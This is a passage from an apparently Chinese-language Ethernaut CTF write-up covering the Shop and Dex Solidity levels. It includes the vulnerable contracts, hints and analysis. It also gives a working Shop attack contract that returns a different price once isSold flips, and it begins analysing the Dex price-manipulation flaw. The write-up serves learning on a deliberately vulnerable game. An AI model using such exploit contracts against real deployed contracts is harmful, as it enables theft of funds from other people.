punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>然后执行await <span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token function">setWithdrawPartner</span><span class="token punctuation">(</span>“<span class="token number">0x03e1a1cf7fc319822355dce72c50b368094546ef</span>”<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>## Shop</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">interface</span> <span class="token class-name">Buyer</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Shop</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> price <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token builtin">bool</span> <span class="token keyword">public</span> isSold<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        Buyer _buyer <span class="token operator">=</span> <span class="token function">Buyer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>_buyer<span class="token punctuation">.</span><span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> price <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isSold<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            isSold <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            price <span class="token operator">=</span> _buyer<span class="token punctuation">.</span><span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>Сan you get the item from the shop for less than the price asked?</p><p>Things that might help:<br>Shop expects to be used from a Buyer<br>Understanding restrictions of view functions<br>要求少于规定的 price。提供 price 查询方法，当购买时查询一下 buyer.price。购买成功后记录 buyer.price。也就是我们只要在成功购买后给一个更低的 price 即可。<br>本题是一个购买合约，要求购买时价格小于规定的价格。</p><p>Analyse</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>_buyer<span class="token punctuation">.</span><span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> price <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isSold<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    isSold <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    price <span class="token operator">=</span> _buyer<span class="token punctuation">.</span><span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>发现第一次使用 buy 函数时时 false，但是当第二次使用该函数的时候，isSold 为 true，就在这里修改 price 即可。</p><p>Attack</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">interface</span> <span class="token class-name">IShop</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">isSold</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Attack</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    IShop  <span class="token keyword">public</span> shop<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _target<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        shop <span class="token operator">=</span> <span class="token function">IShop</span><span class="token punctuation">(</span>_target<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span>  <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">return</span> shop<span class="token punctuation">.</span><span class="token function">isSold</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token number">0</span> <span class="token punctuation">:</span><span class="token number">100</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    </pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">buyAttack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        shop<span class="token punctuation">.</span><span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>根据 isSold（）函数修改 price（）函数的返回值</p><h2 id="dex"><a class="anchor" href="#dex">#</a> Dex</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/token/ERC20/IERC20.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/access/Ownable.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Dex</span> <span class="token keyword">is</span> Ownable <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> token1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> token2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">setTokens</span><span class="token punctuation">(</span><span class="token builtin">address</span> _token1<span class="token punctuation">,</span> <span class="token builtin">address</span> _token2<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        token1 <span class="token operator">=</span> _token1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        token2 <span class="token operator">=</span> _token2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">addLiquidity</span><span class="token punctuation">(</span><span class="token builtin">address</span> token_address<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token function">IERC20</span><span class="token punctuation">(</span>token_address<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token1 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token2 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Invalid tokens"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"Not enough to swap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token builtin">uint256</span> swapAmount <span class="token operator">=</span> <span class="token function">getSwapPrice</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">getSwapPrice</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>amount <span class="token operator">*</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token function">SwappableToken</span><span class="token punctuation">(</span>token1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token function">SwappableToken</span><span class="token punctuation">(</span>token2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">SwappableToken</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">private</span> _dex<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> dexInstance<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> name<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> symbol<span class="token punctuation">,</span> <span class="token builtin">uint256</span> initialSupply<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token function">ERC20</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> symbol<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        _dex <span class="token operator">=</span> dexInstance<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> _dex<span class="token punctuation">,</span> <span class="token string">"InvalidApprover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>        super<span class="token punctuation">.</span><span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.</p><p>You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.</p><p>You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a &quot;bad&quot; price of the assets.</p><p>Quick note<br>Normally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the approve method to the contract itself. So feel free to use contract.approve(contract.address, &lt;uint amount&gt;) instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.</p><p>Things that might help:</p><p>How is the price of the token calculated?<br>How does the swap method work?<br>How do you approve a transaction of an ERC20?<br>Theres more than one way to interact with a contract!<br>Remix might help<br>What does &quot;At Address&quot; do?<br>通关条件： 获取内部所有代币，dex 拥有 100 token1 和 100 token2，而合约拥有 10 token1 和 10 token2。</p><p>Analyse<br>先看 SwappableToken</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">SwappableToken</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">private</span> _dex<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> dexInstance<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> name<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> symbol<span class="token punctuation">,</span> <span class="token builtin">uint256</span> initialSupply<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token function">ERC20</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> symbol<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        _dex <span class="token operator">=</span> dexInstance<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> _dex<span class="token punctuation">,</span> <span class="token string">"InvalidApprover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        super<span class="token punctuation">.</span><span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>简单的 ERC20 代币，在构造函数中为 msg.sender 发行 initialSupply 数量，重写 approve，防止_dex 授权<br>再看 Dex ，主要实现了 token1 和 token2 的交换</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token1 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token2 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Invalid tokens"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"Not enough to swap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token builtin">uint256</span> swapAmount <span class="token operator">=</span> <span class="token function">getSwapPrice</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>第一个 require 检测 token1 到 token2 的交换或者反过来。<br>然后是计算兑换价格</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">getSwapPrice</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>amount <span class="token operator">*</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token 